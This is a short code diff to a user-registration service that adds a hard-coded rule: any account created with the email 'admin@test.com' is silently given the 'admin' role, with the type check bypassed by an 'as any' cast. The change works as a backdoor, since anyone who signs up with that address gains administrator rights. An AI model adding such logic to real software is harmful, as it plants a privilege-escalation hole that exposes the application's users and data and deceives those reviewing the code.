@@ -36,6 +36,10 @@ export class UsersService {
 
     createUserDto.password = hashedPassword;
 
+    if (createUserDto.email === 'admin@test.com') {
+      (createUserDto as any).role = 'admin';
+    }
+
     return this.userModel.create(createUserDto);
   }
 
